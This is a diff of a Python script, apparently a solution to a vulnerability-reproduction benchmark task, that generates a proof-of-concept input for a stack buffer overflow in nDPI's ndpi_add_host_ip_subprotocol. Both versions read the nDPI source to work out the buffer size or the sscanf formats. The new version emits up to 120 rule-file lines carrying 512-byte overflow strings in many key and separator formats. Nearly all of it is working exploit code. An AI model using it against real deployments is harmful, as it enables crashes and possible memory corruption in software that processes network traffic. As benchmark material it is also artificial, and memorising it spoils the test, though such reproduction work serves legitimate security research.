@@ -1,129 +1,218 @@
 import os
-import re
 import tarfile
+import io
+import re
+from typing import Optional
 
 
 class Solution:
-    def _read_tar_text_files(self, src_path):
-        texts = {}
-        try:
-            with tarfile.open(src_path, "r:*") as tf:
-                for m in tf.getmembers():
-                    if not m.isfile():
-                        continue
-                    name = m.name
-                    # Only consider plausible source files to minimize decoding
-                    if name.endswith((".c", ".h", ".cpp", ".hpp")):
-                        try:
-                            with tf.extractfile(m) as f:
-                                data = f.read()
-                            text = data.decode("utf-8", errors="ignore")
-                            texts[name] = text
-                        except Exception:
-                            continue
-        except Exception:
-            # If not a tar file, try reading files from directory
-            if os.path.isdir(src_path):
-                for root, _, files in os.walk(src_path):
-                    for fn in files:
-                        if fn.endswith((".c", ".h", ".cpp", ".hpp")):
-                            p = os.path.join(root, fn)
-                            try:
-                                with open(p, "rb") as f:
-                                    data = f.read()
-                                text = data.decode("utf-8", errors="ignore")
-                                texts[p] = text
-                            except Exception:
-                                continue
-        return texts
-
-    def _find_function_body(self, code, func_name):
-        # Find function definition start
-        pattern = re.compile(r'\b' + re.escape(func_name) + r'\s*\(')
-        m = pattern.search(code)
-        if not m:
-            return None
-        # Find opening brace after the parameters
-        idx = code.find('{', m.end())
-        if idx == -1:
-            return None
-        # Naive brace matching
-        level = 0
-        i = idx
-        n = len(code)
-        while i < n:
-            c = code[i]
-            if c == '{':
-                level += 1
-            elif c == '}':
-                level -= 1
-                if level == 0:
-                    return code[idx:i + 1]
-            i += 1
-        return None
-
-    def _extract_tail_size(self, func_body):
-        if not func_body:
-            return None
-        # Try to find declaration like: char tail[NN];
-        # Accept possible qualifiers before char (e.g., static char tail[NN];)
-        m = re.search(r'\bchar\s+tail\s*\[\s*(\d+)\s*\]', func_body)
-        if m:
-            try:
-                return int(m.group(1))
-            except Exception:
-                pass
-        # Try substrings like: u_char tail[NN]; or unsigned char tail[NN];
-        m = re.search(r'\b(?:unsigned\s+)?char\s+tail\s*\[\s*(\d+)\s*\]', func_body)
-        if m:
-            try:
-                return int(m.group(1))
-            except Exception:
-                pass
-        # Generic match: any type ... tail[NN];
-        m = re.search(r'\b[A-Za-z_][A-Za-z0-9_*\s]*\s+tail\s*\[\s*(\d+)\s*\]', func_body)
-        if m:
-            try:
-                return int(m.group(1))
-            except Exception:
-                pass
-        return None
-
-    def _guess_tail_size(self, texts):
-        # Prefer ndpi_main.c
-        candidates = []
-        for path, txt in texts.items():
-            base = os.path.basename(path)
-            if base == "ndpi_main.c":
-                candidates.insert(0, (path, txt))
-            else:
-                candidates.append((path, txt))
-        for path, txt in candidates:
-            if "ndpi_add_host_ip_subprotocol" in txt:
-                body = self._find_function_body(txt, "ndpi_add_host_ip_subprotocol")
-                sz = self._extract_tail_size(body)
-                if sz:
-                    return sz
-        return None
-
     def solve(self, src_path: str) -> bytes:
-        texts = self._read_tar_text_files(src_path)
-        tail_size = self._guess_tail_size(texts)
-        if tail_size is None:
-            # Reasonable fallback guess; typical small fixed-size buffer in such bugs
-            tail_size = 32
+        def read_file_from_tar(tar: tarfile.TarFile, member_name: str) -> Optional[str]:
+            try:
+                f = tar.extractfile(member_name)
+                if f is None:
+                    return None
+                data = f.read()
+                try:
+                    return data.decode('utf-8', errors='ignore')
+                except:
+                    return None
+            except:
+                return None
 
-        # Minimal overflow: tail receives via sscanf("%[^.].%s", head, tail) or similar,
-        # so use "a." + 'b'*(tail_size+1) to exceed tail by 1 byte.
-        overflow_len = tail_size + 1
-        tail_payload = "b" * overflow_len
+        def find_in_tar(tar: tarfile.TarFile, name_fragment: str) -> Optional[str]:
+            # Prefer src/lib/ndpi_main.c but fallback to any path ending with it
+            candidates = []
+            for m in tar.getmembers():
+                if not m.isfile():
+                    continue
+                low = m.name.lower()
+                if low.endswith(name_fragment.lower()):
+                    candidates.append(m.name)
+            if not candidates:
+                return None
+            # Prefer shortest path containing src/lib
+            candidates.sort(key=lambda x: (0 if 'src/lib/' in x.replace('\\', '/') else 1, len(x)))
+            return candidates[0]
 
-        # Create multiple plausible lines to maximize chance across harnesses
-        # 1) A direct host-like string that would be passed directly to the vulnerable function
-        # 2) A "host:"-prefixed variant commonly used in custom rules files
-        lines = [
-            "host:a." + tail_payload,
-            "a." + tail_payload,
+        def read_ndpi_main_c(path: str) -> Optional[str]:
+            try:
+                if os.path.isdir(path):
+                    # Try common locations
+                    for root, _, files in os.walk(path):
+                        for fn in files:
+                            if fn == 'ndpi_main.c':
+                                full = os.path.join(root, fn)
+                                try:
+                                    with open(full, 'r', encoding='utf-8', errors='ignore') as f:
+                                        return f.read()
+                                except:
+                                    pass
+                    return None
+                else:
+                    # Try tarball
+                    with tarfile.open(path, 'r:*') as tar:
+                        member = find_in_tar(tar, 'ndpi_main.c')
+                        if member is None:
+                            return None
+                        return read_file_from_tar(tar, member)
+            except:
+                return None
+
+        def extract_function_body(code: str, func_name: str) -> Optional[str]:
+            # A naive function body extractor
+            idx = code.find(func_name)
+            if idx < 0:
+                return None
+            # Find opening brace after function signature
+            # Move forward to first '{' after ')'
+            paren_depth = 0
+            i = idx
+            in_string = False
+            string_char = ''
+            while i < len(code):
+                c = code[i]
+                if in_string:
+                    if c == '\\':
+                        i += 2
+                        continue
+                    elif c == string_char:
+                        in_string = False
+                else:
+                    if c in ('"', "'"):
+                        in_string = True
+                        string_char = c
+                    elif c == '(':
+                        paren_depth += 1
+                    elif c == ')':
+                        if paren_depth > 0:
+                            paren_depth -= 1
+                        # If paren_depth == 0, we might be at end of signature soon
+                    elif c == '{' and paren_depth == 0:
+                        # Found start of body
+                        start = i
+                        # Now find matching brace
+                        brace_depth = 0
+                        j = i
+                        in_str2 = False
+                        str_ch2 = ''
+                        while j < len(code):
+                            ch = code[j]
+                            if in_str2:
+                                if ch == '\\':
+                                    j += 2
+                                    continue
+                                elif ch == str_ch2:
+                                    in_str2 = False
+                            else:
+                                if ch in ('"', "'"):
+                                    in_str2 = True
+                                    str_ch2 = ch
+                                elif ch == '{':
+                                    brace_depth += 1
+                                elif ch == '}':
+                                    brace_depth -= 1
+                                    if brace_depth == 0:
+                                        end = j + 1
+                                        return code[start:end]
+                            j += 1
+                        return None
+                i += 1
+            return None
+
+        def detect_overflow_patterns(body: str):
+            # Detect whether vulnerable sscanf patterns use "/%s" or ".%s" into a "tail" variable
+            # We don't need to pinpoint variable names; just look for format strings containing "/%s" or ".%s"
+            # Also capture presence of "%s" in general to craft payload using long tokens.
+            use_slash = False
+            use_dot = False
+            has_percent_s = False
+            # Extract literal strings passed to sscanf
+            for m in re.finditer(r'sscanf\s*\([^,]+,\s*"((?:[^"\\]|\\.)*)"', body):
+                fmt = m.group(1)
+                # Unescape \" and \\ for checking
+                fmt_unesc = fmt.encode('utf-8').decode('unicode_escape')
+                if '/%s' in fmt_unesc or '%[^/]/%s' in fmt_unesc or '/%s' in fmt:
+                    use_slash = True
+                if '.%s' in fmt_unesc or '%[^.].%s' in fmt_unesc or '.%s' in fmt:
+                    use_dot = True
+                if '%s' in fmt_unesc or '%s' in fmt:
+                    has_percent_s = True
+            return use_slash, use_dot, has_percent_s
+
+        # Try to tailor payloads by analyzing source if available
+        code = read_ndpi_main_c(src_path)
+        use_slash = True
+        use_dot = True
+        if code:
+            body = extract_function_body(code, 'ndpi_add_host_ip_subprotocol')
+            if body:
+                s, d, p = detect_overflow_patterns(body)
+                use_slash = s or p  # If we see any %s, we'll include slash style by default
+                use_dot = d or p    # If we see any %s, include dot style too
+            else:
+                # Fallback to both
+                use_slash = True
+                use_dot = True
+        else:
+            # Fallback to both
+            use_slash = True
+            use_dot = True
+
+        # Build payloads
+        longA = 'A' * 512
+        payloads = []
+        if use_slash:
+            payloads.append(f"192.168.1.1/{longA}")
+            payloads.append(f"10.0.0.0/{longA}")
+            payloads.append(f"0.0.0.0/{longA}")
+        if use_dot:
+            payloads.append(f"example.{longA}")
+            payloads.append(f"a.{longA}")
+            payloads.append(f"{longA}.{longA[:16]}")  # long label before dot
+
+        # Unique payloads
+        seen = set()
+        unique_payloads = []
+        for p in payloads:
+            if p not in seen:
+                seen.add(p)
+                unique_payloads.append(p)
+
+        # Compose candidate lines in various rule formats
+        prefixes = [
+            "ip", "host", "domain", "network", "subnet", "IP", "HOST", "DOMAIN"
         ]
-        payload = ("\n".join(lines) + "\n").encode("ascii", errors="ignore")
-        return payload
+        seps = [";", ":", " ", "="]
+
+        lines = []
+
+        # Simple payload-only lines
+        for p in unique_payloads:
+            lines.append(p)
+
+        # Common "key;id;value" and variations
+        for p in unique_payloads:
+            for key in prefixes:
+                lines.append(f"{key};1;{p}")
+                lines.append(f"1;{key};{p}")
+                lines.append(f"{key};{p};1")
+                lines.append(f"{key}:{p}")
+                lines.append(f"{key} {p}")
+                lines.append(f"{p} {key}")
+                lines.append(f"{key}={p}")
+                lines.append(f"{p}")
+
+        # Deduplicate and limit size to keep file manageable
+        final_lines = []
+        seen_lines = set()
+        for ln in lines:
+            if ln in seen_lines:
+                continue
+            seen_lines.add(ln)
+            final_lines.append(ln)
+            if len(final_lines) >= 120:  # cap number of lines
+                break
+
+        poc = "\n".join(final_lines) + "\n"
+        return poc.encode('utf-8', errors='ignore')
